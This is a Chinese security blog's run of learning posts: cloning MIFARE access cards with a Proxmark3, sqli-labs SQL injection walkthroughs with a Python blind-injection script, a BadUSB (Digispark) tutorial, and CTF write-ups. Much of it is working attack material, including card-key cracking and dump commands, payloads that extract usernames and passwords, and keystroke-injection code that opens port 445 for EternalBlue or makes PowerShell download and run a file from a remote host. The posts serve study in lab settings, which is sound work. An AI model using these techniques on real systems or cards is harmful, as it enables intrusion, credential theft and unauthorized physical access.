↓利用MFOC漏洞用已知扇区密钥求所有扇区密钥↓用破解出的密匙把卡片数据读出导入电脑↓把电脑中的数据写入UID卡中&emsp;&emsp;第一步是最重要也是最难的一步，很多IC卡往往都是难以攻破0扇区的密钥而无法进行下一步。默认密码扫描看运气，PRNG漏洞攻击概率低，后面两个虽然概率高但是成本高且实施比较困难。&emsp;&emsp;上面的Proxmark Tool是官方英文版GUI，还有国内中文版GUI（Proxmark3_EASY_GUI），中文版的GUI比较简单，不用记很多命令，原生态PM3指令台就是纯命令行模式，看起来也比较有逼格点。一开始我是根据资料用英文版的GUI，感觉不怎么好用，后来用了原生态后觉得原生态的好用多了，但是要记命令，命令忘记了就用中文GUI查命令ㄟ( ▔, ▔ )ㄏ。can&#39;t slect card这个bug也是在用了原生态之后才知道的。PRNG漏洞获取0扇区密钥，486固件不掉线外，630之后的固件，有些卡可以破，有卡些会掉线并出现can’t slect card 获取0扇区密钥扯远了，默认密码扫描hf mf chk *1 ? tproxmark3&gt; hf mf chk *1 ? t No key specified, trying default keys chk default key[ 0] ffffffffffff chk default key[ 1] 000000000000 chk default key[ 2] a0a1a2a3a4a5 chk default key[ 3] b0b1b2b3b4b5 chk default key[ 4] aabbccddeeff chk default key[ 5] 4d3a99c351dd chk default key[ 6] 1a982c7e459a chk default key[ 7] d3f7d3f7d3f7 chk default key[ 8] 714c5c886e97 chk default key[ 9] 587ee5f9350f chk default key[10] a0478cc39091 chk default key[11] 533cb6c723f6 chk default key[12] 8fd0a4f256e9 --sector: 0, block: 3, key type:A, key count:13 . . . --sector:15, block: 63, key type:B, key count:13 Found valid key:[ffffffffffff] Found keys have been transferred to the emulator memory 密码是默认密码的时候可以扫的出来，不是默认密码可以尝试PRNG漏洞获取0扇区密钥hf mf mifareproxmark3&gt;hf mf mifare . . . uid(ea117dee) nt(431c39b0) par(0000000000000000) ks(030702000a030209) nr(800000005) |diff|&#123;nr&#125; |ks3|ks3^5|parity | +----+--------+---+-----+---------------+ | 00 |00000005| 3 | 6 |0,0,0,0,0,0,0,0| | 20 |00000025| 7 | 2 |0,0,0,0,0,0,0,0| | 40 |00000045| 2 | 7 |0,0,0,0,0,0,0,0| | 60 |00000065| 0 | 5 |0,0,0,0,0,0,0,0| | 80 |00000085| a | f |0,0,0,0,0,0,0,0| | a0 |000000a5| 3 | 6 |0,0,0,0,0,0,0,0| | c0 |000000c5| 2 | 7 |0,0,0,0,0,0,0,0| | e0 |000000e5| 9 | c |0,0,0,0,0,0,0,0| parity is all zero,try special attack!just wait for few more seconds... p1:0 p2:0 p3:0 key:ffffffffffff p1:58b87 p2:61ec p3:1 key:b4c98bd73e94 p1:c6a1b p2:d983 p3:2 key:576efc88ccc7 p1:ef844 p2:106dd p3:3 key:34ed3c6092e9 p1:f7e1e p2:10fd7 p3:4 key:2de06659d60e p1:1239c0 p2:13fa0 p3:5 key:08b7558601a1 p1:12d1b3 p2:149c9 p3:6 key:00adbba1e330 key_count:7 ------------------------------------------------------------------ Key found:ffffffffffff Found valid key:ffffffffffff 因为设备是我小姐姐的，固件是630之后的，所以会出现很多#db# Mifare: Can&#39;t select card,就放不了全部代码，查看固件命令hw versionproxmark3&gt; hw version #db# Prox/RFID mark3 RFID instrument #db# bootrom: /-suspect 2016-11-09 00:59:56 #db# os: /-suspect 2016-12-08 12:45:38 #db# HF FPGA image built on 2015/03/09 at 08:41:42 #db# Modify by Willok(willok@163.com) #db# proxmark3.taobao.com uC: AT91SAM7S256 Rev B Embedded Processor: ARM7TDMI Nonvolatile Program Memory Size: 256K bytes Second Nonvolatile Program Memory Size: None Internal SRAM Size: 64K bytes Architecture Identifier: AT91SAM7Sxx Series Nonvolatile Program Memory Type: Embedded Flash Memory Tip:固件版本是根据固件的日期来看的我们可以测试一下我们拿到的密钥对不对，错误不会返回最下面那一行proxmark3&gt; hf mf chk 0 A ffffffffffff chk key[ 0] ffffffffffff --sector: 0, block: 0, key type:A, key count: 1 Found valid key:[ffffffffffff] 知一求十五获取到0扇区的密钥后我们就可以通过MFOC漏洞获取所有扇区的密钥（100%成功）proxmark3&gt; hf mf nested 1 0 A ffffffffffff //0是0扇区，A密钥 Testing known keys. Sector count=16 nested... Time in nested: 4.330 (inf sec per key) ----------------------------------------------- Iterations count: 0 |---|----------------|---|----------------|---| |sec|key A |res|key B |res| |---|----------------|---|----------------|---| |000| ffffffffffff | 1 | ffffffffffff | 1 | |001| ffffffffffff | 1 | ffffffffffff | 1 | |002| ffffffffffff | 1 | ffffffffffff | 1 | |003| ffffffffffff | 1 | ffffffffffff | 1 | |004| ffffffffffff | 1 | ffffffffffff | 1 | |005| ffffffffffff | 1 | ffffffffffff | 1 | |006| ffffffffffff | 1 | ffffffffffff | 1 | |007| ffffffffffff | 1 | ffffffffffff | 1 | |008| ffffffffffff | 1 | ffffffffffff | 1 | |009| ffffffffffff | 1 | ffffffffffff | 1 | |010| ffffffffffff | 1 | ffffffffffff | 1 | |011| ffffffffffff | 1 | ffffffffffff | 1 | |012| ffffffffffff | 1 | ffffffffffff | 1 | |013| ffffffffffff | 1 | ffffffffffff | 1 | |014| ffffffffffff | 1 | ffffffffffff | 1 | |015| ffffffffffff | 1 | ffffffffffff | 1 | |---|----------------|---|----------------|---| 接下来导出密钥proxmark3&gt; hf mf nested 1 0 A ffffffffffff d Testing known keys. Sector count=16 nested... Time in nested: 4.302 (inf sec per key) ----------------------------------------------- Iterations count: 0 |---|----------------|---|----------------|---| |sec|key A |res|key B |res| |---|----------------|---|----------------|---| |000| ffffffffffff | 1 | ffffffffffff | 1 | |001| ffffffffffff | 1 | ffffffffffff | 1 | |002| ffffffffffff | 1 | ffffffffffff | 1 | |003| ffffffffffff | 1 | ffffffffffff | 1 | |004| ffffffffffff | 1 | ffffffffffff | 1 | |005| ffffffffffff | 1 | ffffffffffff | 1 | |006| ffffffffffff | 1 | ffffffffffff | 1 | |007| ffffffffffff | 1 | ffffffffffff | 1 | |008| ffffffffffff | 1 | ffffffffffff | 1 | |009| ffffffffffff | 1 | ffffffffffff | 1 | |010| ffffffffffff | 1 | ffffffffffff | 1 | |011| ffffffffffff | 1 | ffffffffffff | 1 | |012| ffffffffffff | 1 | ffffffffffff | 1 | |013| ffffffffffff | 1 | ffffffffffff | 1 | |014| ffffffffffff | 1 | ffffffffffff | 1 | |015| ffffffffffff | 1 | ffffffffffff | 1 | |---|----------------|---|----------------|---| Printing keys to binary file dumpkeys.bin... 导出后会在根目录生成一个dumpkeys.bin的文件，里面存放了16个扇区的密钥（16进制） 导出数据拿到密码后我们就可以导出卡上的数据到电脑里proxmark3&gt; hf mf dump |-----------------------------------------| |------ Reading sector access bits...-----| |-----------------------------------------| #db# READ BLOCK FINISHED #db# READ BLOCK FINISHED . . . #db# READ BLOCK FINISHED #db# READ BLOCK FINISHED |-----------------------------------------| |----- Dumping all blocks to file... -----| |-----------------------------------------| #db# READ BLOCK FINISHED Successfully read block 0 of sector 0. #db# READ BLOCK FINISHED Successfully read block 1 of sector 0. . . . #db# READ BLOCK FINISHED Successfully read block 3 of sector 15. Dumped 64 blocks (1024 bytes) to file dumpdata.bin 同样16进制打开因为是测试卡，所以里面就没什么数据ㄟ( ▔, ▔ )ㄏ。 写入UID卡下一步把数据写进写UID卡Proxmark3不能识别、使用bin文件，需要转换成eml格式第一个方法是运行下面的命令转成eml格式proxmark3&gt; script run dumptoemul.lua --- Executing: ./scripts/dumptoemul.lua, args'' Wrote an emulator-dump to the file EA117DEE.eml -----Finished 第二个方法是运行dump to EML.bat脚本转成eml格式写入到白卡（UID卡）上proxmark3&gt; hf mf cload dumpdata Loaded from file: dumpdata.eml 写卡是没有回显的，只能通过读取的方式查看有没有读取成功，对比两张卡的数据就可以看到数据是一模一样的，克隆就完成了IC卡破解不止这一种方法，能力和设备有限，以后有机会会继续学习下去","categories":[],"tags":[{"name":"Proxmark3","slug":"Proxmark3","permalink":"http://yoursite.com/tags/Proxmark3/"},{"name":"RFID","slug":"RFID","permalink":"http://yoursite.com/tags/RFID/"},{"name":"硬件破解","slug":"硬件破解","permalink":"http://yoursite.com/tags/硬件破解/"}]},{"title":"sqli-labs的学习记录一（1-8）","slug":"sqli-labs1","date":"2018-07-20T10:49:52.000Z","updated":"2020-09-18T03:22:21.766Z","comments":true,"path":"2018/07/20/sqli-labs1/","link":"","permalink":"http://yoursite.com/2018/07/20/sqli-labs1/","excerpt":"&emsp;&emsp;偶然发现sqli-labs这个练习平台（本地），这个平台有很多案例可以提供给同学学习，很适合初学者入门。写篇博客装个逼记录下学习过程（假装我是大佬）","text":"&emsp;&emsp;偶然发现sqli-labs这个练习平台（本地），这个平台有很多案例可以提供给同学学习，很适合初学者入门。写篇博客装个逼记录下学习过程（假装我是大佬） 下载安装 首先附上github的下载地址–&gt;传送门 下载phpstudy，phpstudy的站点目录是这个PHPTutorial\\WWW，把刚刚下载的平台解压放到里面 如果我没记错的话，phpstudy的mysql初始密码是root，在sql-connections\\db-creds.inc写上你的mysql数据库密码上述步骤做完后就可以启动phpstudy，然后打开火狐浏览器（记得安装hackbar插件），访问localhost/sqli-labs-master/看待下面的页面就算安装好了点击Setup/reset Database for labs建立数据库 开始学习less-1第一关是最简单的一关了，直接id=1&#39;就报错了再测试id=1&#39; and &#39;1&#39;=&#39;1返回正常，不难想象我们想数据库递交id=1的语句为select * from tables where id = '1' 递交id=1&#39; and &#39;1&#39;=&#39;1的语句为select * from tables where id = '1' and '1'='1' 接下来测试id=1&#39; union select database() -- +，-- +是注释符发现报错了，错误上说了，列的数量对不上，修改为id=1&#39; union select 1,2,database() -- +,页面返回正常但没有返回我们所希望的数据库名称这个是因为index.php中mysql_fetch_array函数只调用了一个mysql_fetch_array函数的作用是从结果集中取得一行作为关联数组或数字数组或二者兼有，可以在终端下试一下，这里就不演示了，下面是我们提交sql查询语句在终端下的结果mysql&gt; select * from users where id = '1' union select 1,2,database(); +----+----------+----------+ | id | username | password | +----+----------+----------+ | 1 | Dumb | Dumb | | 1 | 2 | security | +----+----------+----------+ 2 rows in set (0.00 sec) 上面查询结果可以看到返回了两个结果，但是mysql_fetch_array只取一行，也就是说要让查询出来的结果放在第一行，这里就用最简单快捷的一种,把id的1改为-1，-1查询不到，因此结果就是我们想要的mysql&gt; select * from users where id = '-1' union select 1,2,database(); +----+----------+----------+ | id | username | password | +----+----------+----------+ | 1 | 2 | security | +----+----------+----------+ 1 row in set (0.00 sec) 最终的payload为id=-1&#39; union select 1,2,database() -- +由于这篇文章是面向初学者写的，可能会比较啰嗦，mysql数据库初始时有四个数据库，如下mysql&gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | test | +--------------------+ 4 rows in set (0.01 sec) 其中，information_schema这个数据库中存着所有数据库的名字及表单列名，详细的细节这里不列出来有不懂的兴趣的可以去了解一下–&gt;传送门，我们也是要先在这个数据库里找到当前数据库的表单和列名才可以把某个表的数据列出来mysql&gt; select table_name from information_schema.tables where table_schema = 'security'; +------------+ | table_name | +------------+ | emails | | referers | | uagents | | users | +------------+ 4 rows in set (0.00 sec) 这里可以偷个懒，我们可以不找数据库名直接让table_schema=database()就可以省了一步mysql&gt; select table_name from information_schema.tables where table_schema = database(); +------------+ | table_name | +------------+ | emails | | referers | | uagents | | users | +------------+ 4 rows in set (0.00 sec) 所以我们的payload为id=-1' union select 1,2,table_name from information_schema.tables where table_schema = 'security' -- + 但是这样我们只能得到一个表，下面要用到一个函数group__concat，下面演示一下效果mysql&gt; select group_concat(table_name) from information_schema.tables where table_schema = 'security'; +-------------------------------+ | group_concat(table_name) | +-------------------------------+ | emails,referers,uagents,users | +-------------------------------+ 1 row in set (0.00 sec) group_concat的作用就是把多个查询结果并到一起，于是payload修改为id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'security' -- + 用户账号密码应该在users表里头了,我们要查的表就是users表了，简单修改一下payload，把table_name换成column_name，把information_schema.tables换成information_schema.columns，再把table_schema换成table_name，payload为id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users' -- + 列也知道了，我们就直接枚举username和password，payload为id=-1' union select 1,group_concat(username),group_concat(password) from users -- + 第一关就算是过了 less-2第二关和第一关如出一辙，只不过id后面的内容没有引号引起来，php代码对比如下SELECT * FROM users WHERE id='$id' LIMIT 0,1 #第一关 SELECT * FROM users WHERE id=$id LIMIT 0,1 第二关 所以我们把paylaod的id-1后面的单引号去掉就好了甚至注释符都不用payload如下id=-1 union select 1,2,database() id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'security' id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users' id=-1 union select 1,group_concat(username),group_concat(password) from users 第二关完 less-3第三关SELECT * FROM users WHERE id=('$id') LIMIT 0,1 多了括号，直接上payload吧id=-1') union select 1,2,database() -- + 就不多列了 less-4第四关这次有点不同，当我们测试id=1&#39;时返回页面是正常的，测试id=1&quot;报错根据报错信息来看，查询语句大概如下SELECT * FROM users WHERE id=(\"$id\") LIMIT 0,1 看一眼index.php，差不多还是那个payload，换汤不换药id=-1\") union select 1,2,database() -- + less-5第五关开始提高难度首先从大纲里看到第五关是双注入（double injection）,单引号（single quote）这个注入我也好久才理解，就不做了，直接分析首先，sql查询正确会返回You are in...........，错误会返回sql的错误，也就是说我们输入正确的查询语句不会返回结果，所以我们要提交错误的查询语句，或者说会报错的语句比较合适，先介绍一些函数count()，rand(),floor(),concat_wscount() 计算总数 rand() 生成0~1的随机数 floor() 向下取整 concat_ws() 拼接查询结果 最后一个可能不好理解，用例子说明下mysql&gt; select concat_ws(':',username,password) from users; +----------------------------------+ | concat_ws(':',username,password) | +----------------------------------+ | Dumb:Dumb | | admin:admin | | admin1:admin1 | | admin2:admin2 | | admin3:admin3 | | dhakkan:dumbo | | admin4:admin4 | +----------------------------------+ 7 rows in set (0.00 sec) 1rand()2生成0~2的随机数，floor(rand()2)产生0或12以select database()为例子select database() concat_ws(':',select database(),floor(rand()*2)) select conut(*),concat_ws(':',(select database()),floor(rand()*2)) as a from information_schema.tables group by a 数据库名security已经出来了关于原因concat_ws(&#39;:&#39;,select database(),floor(rand()*2))会产生一大堆security:0，security:1的查询结果，重点在group by，在排序时，排序的结果在临时表里，在插入前会先计算一遍要插入结果的内容，假如是security:0，如果此时临时表只有security:1的行不存在security:0的行，那么数据库要将该条记录插入临时表，由于后面的0和1是随机数，在插入时又要计算一次，那么此时的结果可能已经不再是security:0而变成了security:1了，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。后面的基本差不多，就不列了，有人可能把这道题当做盲注来做一开始我也是这么想的 less-6双引号的双注入&gt;，把less-5的单引号变成双引号，换汤不换药 less-7导入文件注入，这个需要知道网站在系统中的具体位置，（网站管理员怎么可能给你知道。。）也比较难，网上也有写的狠详细的过程–&gt;传送门,就直接下一关吧 less-8Blind Boolian Based（布尔盲注），这里又涉及到一个盲注的概念，上面的可以直接返回结果是直接注入拿到数据库表单及列等数据，盲注就是，查询结果正确页面返回正常，查询错误页面返回错误，不会带出数据举很简单的例子,1=1正确1=2错误然后注入方法就是不断的查询，通常盲注都要写脚本，先介绍一些函数，ascii(),这个函数式把字母变成ascii码值，substr()这个函数式切割字符串，假设a=test,substr(a,1,1)=t,substr(a,2,1)=e,以此类推，查数据库payloadid=1' and ascii(substr(database(),1,1)) &gt;= '97 substr取database()的第一个字符，ascii把它变化才能ascii码值，然后做对比，比较它的ascii码值是否大于等于97，即’a’返回正确，然后一直判断下去，遍历所有字母，一个个去试肯定比较麻烦，所以首选写脚本，其次也不能一个个遍历，可以用二分法，可以节省很多时间，python自动跑数据库名脚本如下import requests txt1 = \"http://localhost/sqli-labs/Less-8/?id=1' and ascii(substr(database(),\" txt2 = \",1)) &gt;= '\" txt3 = \",1)) = '\" payload1 = 1 payload2 = 97 txt4 = 'You are in..........' num11 = 97 num12 = 65 num13 = 48 code = '' num1 = 0 num2 = 0 num3 = 0 for i in range(1,9)://长度 url = txt1+str(i)+txt2+str(num11) req = requests.get(url = url) reqtext = req.text[570:590] //reqtext是获取页面上的内容是不是等于txt4 if(reqtext == txt4): num1 = 1 url = txt1+str(i)+txt2+str(num12) req = requests.get(url = url) reqtext = req.text[570:590] if(reqtext == txt4): num2 = 1 url = txt1+str(i)+txt2+str(num13) req = requests.get(url = url) reqtext = req.text[570:590] if(reqtext == txt4): num3 = 1 //判断范围，数字48-57，大写65-90，小写97-122 //字母切三次，判断三次，部分四次，abc def ghi jklm nop qrs tuv wxyz //数字切一次，判断五次，01234 56789 if(num1 == 1): num = 97 num += 13 url = txt1+str(i)+txt2+str(num) req = requests.get(url = url) reqtext = req.text[570:590] if(reqtext == txt4): num += 6 else: num -= 7 url = txt1+str(i)+txt2+str(num) req = requests.get(url = url) reqtext = req.text[570:590] if(reqtext == txt4): num += 3 else: num -= 3 url = txt1+str(i)+txt2+str(num) req = requests.get(url = url) reqtext = req.text[570:590] if(reqtext != txt4): num -= 3 if(reqtext == txt4) and ((num == 106) or (num == 119)): for j in range(num,num+4): url = txt1+str(i)+txt3+str(j) req = requests.get(url = url) reqtext = req.text[570:590] if(reqtext == txt4): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 else: for j in range(num,num+3): url = txt1+str(i)+txt3+str(j) req = requests.get(url = url) reqtext = req.text[570:590] if(reqtext == txt4): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 if(num1 == 0 and num2 == 1): num = 65 num += 13 url = txt1+str(i)+txt2+str(num) req = requests.get(url = url) reqtext = req.text[570:590] if(reqtext == txt4): num += 6 else: num -= 7 url = txt1+str(i)+txt2+str(num) req = requests.get(url = url) reqtext = req.text[570:590] if(reqtext == txt4): num += 3 else: num -= 3 url = txt1+str(i)+txt2+str(num) req = requests.get(url = url) reqtext = req.text[570:590] if(reqtext != txt4): num -= 3 if(reqtext == txt4) and ((num == 74) or (num == 87)): for j in range(num,num+4): url = txt1+str(i)+txt3+str(j) req = requests.get(url = url) reqtext = req.text[570:590] if(reqtext == txt4): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 else: for j in range(num,num+3): url = txt1+str(i)+txt3+str(j) req = requests.get(url = url) reqtext = req.text[570:590] if(reqtext == txt4): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 if(num2 == 0 and num3 == 1): num =48 num += 5 url = txt1+str(i)+txt2+str(num) req = requests.get(url = url) reqtext = req.text[570:590] if(reqtext == txt4): for j in range(num,num+5): url = txt1+str(i)+txt3+str(j) req = requests.get(url = url) reqtext = req.text[570:590] if(reqtext == txt4): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 else: num -= 5 for j in range(num,num+5): url = txt1+str(i)+txt3+str(j) req = requests.get(url = url) reqtext = req.text[570:590] if(reqtext == txt4): code += chr(j) print code num1 = 0 num2 = 0 num3 = 0 结果如下查表查列修改代码url部分即可,给出前面部分，长度需要自己调整，手工判断下就可以了，没有必要写脚本import requests txt1 = \"http://localhost/sqli-labs/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 2,1),\" txt2 = \",1))) &gt;= '\" txt3 = \",1))) = '\" 妈呀写博客比学的还累。。。","categories":[],"tags":[{"name":"注入","slug":"注入","permalink":"http://yoursite.com/tags/注入/"},{"name":"web","slug":"web","permalink":"http://yoursite.com/tags/web/"},{"name":"盲注","slug":"盲注","permalink":"http://yoursite.com/tags/盲注/"}]},{"title":"badusb的学习记录&入侵windows主机","slug":"badusb","date":"2018-06-11T16:35:47.000Z","updated":"2020-09-18T03:19:43.934Z","comments":true,"path":"2018/06/12/badusb/","link":"","permalink":"http://yoursite.com/2018/06/12/badusb/","excerpt":"写在前面&emsp;&emsp;对于人们熟悉的网络安全，一旦发现漏洞可以很快的应对和修补，然而对于硬件安全，漏洞的危害即使不是很大也要耗费很大的人力物力才可以把有问题的设施更换掉，对于一些比更大的漏洞就更加难并且花费巨大","text":"写在前面&emsp;&emsp;对于人们熟悉的网络安全，一旦发现漏洞可以很快的应对和修补，然而对于硬件安全，漏洞的危害即使不是很大也要耗费很大的人力物力才可以把有问题的设施更换掉，对于一些比更大的漏洞就更加难并且花费巨大 知识准备&emsp;&emsp;灯灯灯凳，这个就是我们的主角啦&emsp;&emsp;对于第一次玩硬件的小伙伴，硬件入门不难，但是要有耐心，很多时候是需要不断的去调试代码，查找资料，所以一定要有耐心。 一、U盘的结构&emsp;&emsp;要想理解badusb攻击的方法就要先了解U盘的结构，U盘的主要结构如下|--------|---------------| | 固件 | 数据存储区 | |--------|---------------| &emsp;&emsp;U盘由芯片控制器和闪存两部分组成（也间接说明为什么U盘的额空间总是不够写的那么大），芯片控制器负责与PC的通讯和识别，闪存用来做数据存储；闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；固件无法通过普通手段进行读取。 usb协议&emsp;&emsp;现在很多设备都是用usb接口，摄像头、U盘、鼠标、键盘，无线键鼠的接收器，等等，为了兼容这么多设备，设计USB协议标准的时候就没有要求每个USB设备向网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备多个输入输出设备的特征。&emsp;&emsp;问题就是在这里，当你插进一个U盘时电脑并没有鉴别你的U盘到是不是真的U盘，这样我们就有机可乘了 入侵原理正常的U盘插到电脑里的大概流程是下面这样的 电脑识别为U盘的固件 固件信息--------------------------&gt;U盘-----&gt;读取U盘的内容-----&gt;示U盘的内容 构造badusb的固件让电脑识别为键盘 电脑识别为键盘的固件 固件信息--------------------------&gt;键盘 再构造里面的内容键盘-----&gt;模拟人敲命令-----&gt;根据写好的脚本敲命令 材料准备&emsp;&emsp;材料清单 Digispark（也就是我们的主角） Arduino（编写以及把脚本写到badusb里的程序） 脚本 开干安装驱动驱动下载地址，链接：http://pan.baidu.com/s/1i4K10dn 密码：ilaf下载好后运行`DPinst64.exe`，32位系统点击`DPinst.exe`,一路回车等待安装完成 下载编写程序的开发软件[https://www.arduino.cc/en/Main/Software](https://www.arduino.cc/en/Main/Software) 运行Arduino，在首选项中添加开发板网址[http://digistump.com/package_digistump_index.json](http://digistump.com/package_digistump_index.json)(不同的板网址不同) 在工具–&gt;开发板–&gt;开发板管理器里，下载这个驱动,等待下载完成即可选择Digispark开发板 编译器选择USBtinyISP 到这里所有准备就做好了 写脚本先看一眼商家给的教程在我的印象中应该是写一个木马进固件然后一插进电脑就黑进去的啊[捂脸][捂脸][捂脸]算了，先一步一步跟着教程摸索下最终代码如下，修改了一点点#include \"DigiKeyboard.h\" #define KEY_ESC 41 #define KEY_BACKSPACE 42 #define KEY_TAB 43 #define KEY_PRT_SCR 70 #define KEY_DELETE 76 void setup() &#123; DigiKeyboard.delay(5000); DigiKeyboard.sendKeyStroke(0); DigiKeyboard.delay(5000); DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); DigiKeyboard.delay(500); DigiKeyboard.print(F(\"cmd\")); DigiKeyboard.delay(500); DigiKeyboard.sendKeyStroke(KEY_ENTER); DigiKeyboard.sendKeyStroke(KEY_ENTER); DigiKeyboard.delay(500); DigiKeyboard.print(F(\"echo\")); DigiKeyboard.sendKeyStroke(0,MOD_SHIFT_LEFT); DigiKeyboard.print(F(\" \")); DigiKeyboard.print(F(\"Team233\")); DigiKeyboard.sendKeyStroke(0,MOD_SHIFT_LEFT); DigiKeyboard.sendKeyStroke(KEY_ENTER); &#125; void loop() &#123; &#125; 编译…没问题,上传…O98k激动人心的时候到了，重新插进电脑去,10秒后…到目前为止就算badusb就算做好了 进阶教程上面只是简单的尝试，接下来要进行更高级的用法然鹅。。。。。只有这么点容量怎么写马，而且商家没说，网上也找不到，怎么写。。。。。忽然想起当时买这个的时候有好多个版本。。。我绝对不会告诉你我是因为它比较便宜体积小迷你好看才买它的经过我一番沉思与实践之后如果目标是win7系统，我们可以利用终端打开445端口，然后使用永恒之蓝漏洞直接getshell如果目标是win10，我们可以从我们搭好的服务器下载木马饭后执行木马程序，对win7也同样适用cmd开启445端口命令如下netsh advfirewall firewall add rule name=\"open 445\" dir=in action=allow protocol=TCP localport=445 编写好的脚本代码如下#include \"DigiKeyboard.h\" #define KEY_ESC 41 #define KEY_BACKSPACE 42 #define KEY_TAB 43 #define KEY_PRT_SCR 70 #define KEY_DELETE 76 void setup() &#123; DigiKeyboard.delay(5000); DigiKeyboard.sendKeyStroke(0); DigiKeyboard.delay(5000); DigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT); DigiKeyboard.delay(500); DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); DigiKeyboard.delay(500); DigiKeyboard.print(F(\"cmd\")); DigiKeyboard.delay(500); DigiKeyboard.sendKeyStroke(KEY_ENTER); DigiKeyboard.delay(500); DigiKeyboard.print(F(\"netsh advfirewall firewall add rule name=\")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(\"open445\")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(\" dir=in protocol=tcp localport=445 action=allow\")); DigiKeyboard.sendKeyStroke(KEY_ENTER); &#125; void loop() &#123; &#125; 在kali下nmap可以看到445端口已经打开,msf直接漏洞利用就可以实现getshellwin10系统下载测试文件Team233.png的脚本代码如下#include \"DigiKeyboard.h\" #define KEY_ESC 41 #define KEY_BACKSPACE 42 #define KEY_TAB 43 #define KEY_PRT_SCR 70 #define KEY_DELETE 76 void setup() &#123; DigiKeyboard.delay(5000); DigiKeyboard.sendKeyStroke(0); DigiKeyboard.delay(5000); DigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT); DigiKeyboard.delay(500); DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT); DigiKeyboard.delay(500); DigiKeyboard.print(F(\"pow\")); DigiKeyboard.delay(500); DigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT); DigiKeyboard.delay(500); DigiKeyboard.sendKeyStroke(KEY_ENTER); DigiKeyboard.delay(500); DigiKeyboard.sendKeyStroke(0,MOD_SHIFT_LEFT); DigiKeyboard.delay(500); DigiKeyboard.print(F(\"$client = new-object System.Net.WebClient\")); DigiKeyboard.sendKeyStroke(KEY_ENTER); DigiKeyboard.print(F(\" $client.DownloadFile('http://192.168.1.2/Team233.png', '.\")); DigiKeyboard.print(char(92)); DigiKeyboard.print(F(\"Team233.png')\")); DigiKeyboard.sendKeyStroke(KEY_ENTER); DigiKeyboard.print(F(\".\")); DigiKeyboard.print(char(92)); DigiKeyboard.print(F(\"Team233.png\")); DigiKeyboard.sendKeyStroke(KEY_ENTER); &#125; void loop() &#123; &#125; 效果就参考我录的视频吧链接: https://pan.baidu.com/s/1m8Ob16yuFoNVjzHoz6VrNQ 密码: c9he未经允许不得传播本文仅供学习之用，不负任何法律责任","categories":[],"tags":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://yoursite.com/tags/硬件安全/"},{"name":"badusb","slug":"badusb","permalink":"http://yoursite.com/tags/badusb/"}]},{"title":"RCTF部分wirteup","slug":"writeup1","date":"2018-05-22T13:51:53.000Z","updated":"2020-09-18T03:21:12.764Z","comments":true,"path":"2018/05/22/writeup1/","link":"","permalink":"http://yoursite.com/2018/05/22/writeup1/","excerpt":"总结RCTF的sign和git两道题","text":"总结RCTF的sign和git两道题 sign&emsp;&emsp;下载得到一个exe，用ida打开，这里选择第二个，如图看到WinMain函数按F5反编译就直接看到flag了 git&emsp;&emsp;下载下来是一个.git文件夹，推测跟git有关，随便打开文件看看看到一些信息稍微了解git应该知道git有分支，回溯分支应该可以还原flag，查看logslinux下使用下面的命令回溯git reset --hard f4d0f6ddf6660f5c9273c84f3de64840a407bef1 cat flag.txt更多的writeup参考大佬的吧，小弟能力有限，就只能做出复现这些大佬的博客–&gt;这里","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"},{"name":"逆向","slug":"逆向","permalink":"http://yoursite.com/tags/逆向/"},{"name":"misc","slug":"misc","permalink":"http://yoursite.com/tags/misc/"},{"name":"git","slug":"git","permalink":"http://yoursite.com/tags/git/"}]},{"title":"RCTF密码题cpushop解题过程","slug":"RCTF-cpushop","date":"2018-05-21T10:23:21.000Z","updated":"2020-09-18T03:21:04.289Z","comments":true,"path":"2018/05/21/RCTF-cpushop/","link":"","permalink":"http://yoursite.com/2018/05/21/RCTF-cpushop/","excerpt":"哈希长度拓展攻击学习参考资料：哈希长度扩展攻击的简介以及HashPump安装使用方法","text":"哈希长度拓展攻击学习参考资料：哈希长度扩展攻击的简介以及HashPump安装使用方法 关于哈希长度拓展&emsp;&emsp;一开始我也是没有想法甚至打算爆破的，后来在师姐的指引下看了谋篇博客（见参考资料），就和师姐一起做出来了，写篇博客记录下。题目文件已上传到百度云,链接: https://pan.baidu.com/s/13d0Re1b_IIez-11dowmvtQ 密码: f1t2 大概解题思路&emsp;&emsp;解释一下题目，linux下nc cpushop.2018.teamrois.cn 43000有四个选项，列出菜单，下订单，支付，退出，flag也在菜单里面，然后就是不择手段买到flag&emsp;&emsp;但是我们的钱是money = random.randint(1000, 10000)这么来的flag价格是99999，也就是说正常方法我们是无论如何也买不到flag的,然而它检查price的方法用了for循环。。。for k,v in parse_qsl(payment): if k == 'product': product = v elif k == 'price': try: price = int(v) except ValueError: print 'Invalid Order!' return 简而言之就是它会一直检查订单里的价格，比方说，你的订单是长介样子的product=xxx&amp;price=99999&amp;price=1上面代码出来的最终结果是price=1signkey是一个8到32位的strsignkey = ''.join([random.choice(string.letters+string.digits) for _ in xrange(random.randint(8,32))]) order的格式def order(): n = input_int('Product ID: ') if n &lt; 0 or n &gt;= len(items): print 'Invalid ID!' return payment = 'product=%s&amp;price=%d&amp;timestamp=%d' % (items[n][0], items[n][1], time.time()*1000000) sign = sha256(signkey+payment).hexdigest() payment += 